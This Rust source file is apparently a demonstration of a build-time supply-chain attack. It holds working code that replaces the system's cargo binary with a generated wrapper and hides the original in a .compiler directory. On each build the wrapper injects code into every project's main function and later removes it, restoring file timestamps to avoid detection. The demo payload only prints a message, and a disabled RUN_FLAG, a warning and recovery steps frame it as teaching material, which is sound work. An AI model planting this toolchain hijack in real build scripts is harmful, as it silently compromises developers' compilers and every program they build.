/*
This code uses builds a wrapper around the Rust compiler on your system. Whenever the compiler is called,
the wrapper, which is located in the library’s build scripts, makes modifications to a target code file,
compiles it, runs the resulting executable, and then reverts the file to its original state while
preserving file metadata such as timestamps. From a user perspective,
no changes are detected, but the Rust compiler has been compromised
*/

use std::env;
use std::fs::OpenOptions;
use std::fs::{self, File};
use std::io::Write;
use std::path::{Path, PathBuf};
use std::process;
use std::process::exit;
use std::process::Command;
use std::process::Stdio;

const RUN_FLAG: bool = false;

fn locate_cargo_bin() -> Option<PathBuf> {
    // Retrieve the PATH environment variable
    if let Ok(paths) = env::var("PATH") {
        // Determine the path separator based on the operating system
        let separator = if cfg!(target_os = "windows") {
            ";"
        } else {
            ":"
        };
        // Iterate over each path in the PATH environment variable
        for path in paths.split(separator) {
            // Construct the full path to the cargo executable
            let cargo_path = Path::new(path).join("cargo");
            // Append '.exe' on Windows platforms
            let cargo_path = if cfg!(target_os = "windows") {
                cargo_path.with_extension("exe")
            } else {
                cargo_path
            };
            // Check if the cargo executable exists and is a file
            if cargo_path.is_file() {
                // Return the full path to the cargo executable if found
                return Some(cargo_path);
            }
        }
    }
    // Return None if the cargo executable is not found in the PATH
    None
}
fn main() -> std::io::Result<()> {
    if !RUN_FLAG {
        println!("This code example shows how build time effects can be exploited.");
        println!("This code example builds a wrapper around the rust compiler.");
        println!("The modified compiler can then modify all furture target code files, compiles them, and execute,");
        println!("and then reverts the file to its original state while preserving file metadata such as timestamps.");
        println!("From a user perspective nothing happened, but the file that got excuted is different than the intended one");
        println!("To truly demonstrate this example this code example should be present in a file named build.rs");
        println!("For safety reasons, it has been placed in bin and disabled.");
        println!("To unable the file, you will have to manually update the RUN_FlAG to true in cargo_wrapper.rs");
        println!("To revert the changes from wrapper, the possible solutions are :");
        println!("1) move the file named cargo in cargo/bin/.compiler back to cargo/bin and delete the .compiler directory");
        println!("2) reinstall the rust compiler and delete the .compiler directory in cargo/bin");
        process::exit(1);
    }

    let cargo_path = match locate_cargo_bin() {
        Some(path) => path,
        None => {
            eprintln!("Failed to locate cargo binary");
            exit(1);
        }
    };
    let cargo_dir = cargo_path.parent().unwrap();
    let new_cargo_path = cargo_dir.join(".compiler/cargo");
    if new_cargo_path.parent().unwrap().exists() {
        return Ok(());
    }

    // Define the project name
    let project_name = "generated_project";

    // Create a new Cargo project
    let status = Command::new("cargo")
        .arg("new")
        .stdout(Stdio::null()) // Suppress stdout
        .stderr(Stdio::null()) // Suppress stderr
        .arg(project_name)
        .status()?;

    if !status.success() {
        eprintln!("System Error");
        std::process::exit(1);
    }

    // Path to the main.rs file within the new Cargo project
    let file_path = Path::new(&project_name).join("src").join("main.rs");

    // The Rust code to write into the main.rs file
    let rust_code = format!(
        r#"
use filetime::{{set_file_times, FileTime}};
use regex::Regex;
use std::fs::{{self, OpenOptions}};
use std::io::{{self, BufReader, Seek, SeekFrom, Write, Read}};
use walkdir::WalkDir;
use std::process::Command;
use std::env;

fn main() -> io::Result<()> {{
    let marker = "// MARKER";
    let src_dir = "src";
    let regex_main_fn = Regex::new(r"^fn main\(\)(?: -> .*)? *\{{").unwrap();

    for entry in WalkDir::new(src_dir)
        .into_iter()
        .filter_map(Result::ok)
        .filter(|e| e.path().extension().map_or(false, |ext| ext == "rs")) {{
        let path = entry.path();
        let metadata_before = fs::metadata(path)?;

        let access_time_before = FileTime::from_last_access_time(&metadata_before);
        let modification_time_before = FileTime::from_last_modification_time(&metadata_before);

        let mut file = OpenOptions::new().read(true).write(true).open(path)?;

        let mut contents = String::new();
        {{
            let mut reader = BufReader::new(&file);
            reader.read_to_string(&mut contents)?;
        }}

        let mut lines: Vec<String> = contents.lines().map(String::from).collect();
        let mut modified = false;

        for (i, line) in lines.iter().enumerate() {{
            if regex_main_fn.is_match(line) {{
	    lines.insert(i + 1, format!("{{}}{{}}{{}}{{}} {{{{ println!(\"hello world, you are under attack\"); }}}} {{}}", "u", "n" , "sa" , "fe" , marker));

                modified = true;
                break;
            }}
        }}

        if modified {{
            file.set_len(0)?; // Truncate the file
            file.seek(SeekFrom::Start(0))?; // Move to the beginning of the file
            for line in &lines {{
                writeln!(file, "{{}}", line)?;
            }}

            // Restore the original file timestamps
            set_file_times(path, access_time_before, modification_time_before)?;
        }}
    }}

    let args: Vec<String> = std::env::args().skip(1).collect();
    let mut command = Command::new({:?});
    for arg in args.iter() {{
        command.arg(arg);
    }}
    let _ = command.status().expect("cargo not found");

    // Remove inserted lines
for entry in WalkDir::new(src_dir)
    .into_iter()
    .filter_map(Result::ok)
    .filter(|e| e.path().extension().map_or(false, |ext| ext == "rs")) {{
    let path = entry.path();

    // Retrieve metadata before making changes to restore timestamps later
    let metadata_before = fs::metadata(&path)?;
    let access_time_before = FileTime::from_last_access_time(&metadata_before);
    let modification_time_before = FileTime::from_last_modification_time(&metadata_before);

    let mut file = OpenOptions::new().read(true).write(true).open(&path)?;

    let mut contents = String::new();
    {{
        let mut reader = BufReader::new(&file);
        reader.read_to_string(&mut contents)?;
    }}

    if contents.contains(marker) {{
        let lines: Vec<String> = contents
            .lines()
            .filter(|line| !line.contains(marker))
            .map(String::from)
            .collect();

        file.set_len(0)?; // Truncate the file
        file.seek(SeekFrom::Start(0))?; // Move to the beginning of the file
        for line in &lines {{
            writeln!(file, "{{}}", line)?;
        }}

        // Restore the original file timestamps
        set_file_times(&path, access_time_before, modification_time_before)?;
    }}
}}

       Ok(())
}}

"#,
        new_cargo_path.to_str().unwrap()
    );

    // Write the Rust code into the main.rs file of the new Cargo project
    let mut file = File::create(&file_path)?;
    file.write_all(rust_code.as_bytes())?;

    // Add dependencies to Cargo.toml
    let cargo_toml_path = Path::new(&project_name).join("Cargo.toml");

    // Read the current contents of the Cargo.toml file
    let mut contents = fs::read_to_string(&cargo_toml_path)?;

    // Find the position of the [dependencies] line and calculate where to insert new dependencies
    let insert_pos = contents.find("[dependencies]").unwrap() + "[dependencies]".len();

    // Define the new dependencies to add
    let new_dependencies = "\nfiletime = \"0.2\"\nregex = \"1.5.4\"\nwalkdir = \"2.3.2\"\n";

    // Insert the new dependencies into the contents string
    contents.insert_str(insert_pos, new_dependencies);
    // Truncate the file and write the modified contents back to Cargo.toml
    let mut cargo_toml = OpenOptions::new()
        .write(true)
        .truncate(true)
        .open(&cargo_toml_path)?;

    cargo_toml.write_all(contents.as_bytes())?;

    // Compile the Cargo project
    Command::new("cargo")
        .arg("build")
        .stdout(Stdio::null()) // Suppress stdout
        .stderr(Stdio::null()) // Suppress stderr
        .current_dir(Path::new(&project_name))
        .status()?;

    fs::create_dir_all(new_cargo_path.parent().unwrap())?;
    fs::rename(&cargo_path, &new_cargo_path)?;

    // Rename the generated project to a generic name, handling platform-specific executable extensions.
    #[cfg(target_os = "windows")]
    let generated_executable_name = "generated_project\\target\\debug\\generated_project.exe";
    #[cfg(not(target_os = "windows"))]
    let generated_executable_name = "generated_project/target/debug/generated_project";

    #[cfg(target_os = "windows")]
    let new_executable_name = "generated_project\\target\\debug\\cargo.exe";
    #[cfg(not(target_os = "windows"))]
    let new_executable_name = "generated_project/target/debug/cargo";

    fs::rename(generated_executable_name, new_executable_name)?;

    // Define the final script path, taking into account platform-specific executable extensions.
    #[cfg(target_os = "windows")]
    let script_file_name = "cargo.exe";
    #[cfg(not(target_os = "windows"))]
    let script_file_name = "cargo";

    let script_path = cargo_dir.join(script_file_name);

    _ = fs::rename(new_executable_name, &script_path);

    _ = fs::remove_dir_all(project_name);

    Ok(())
}
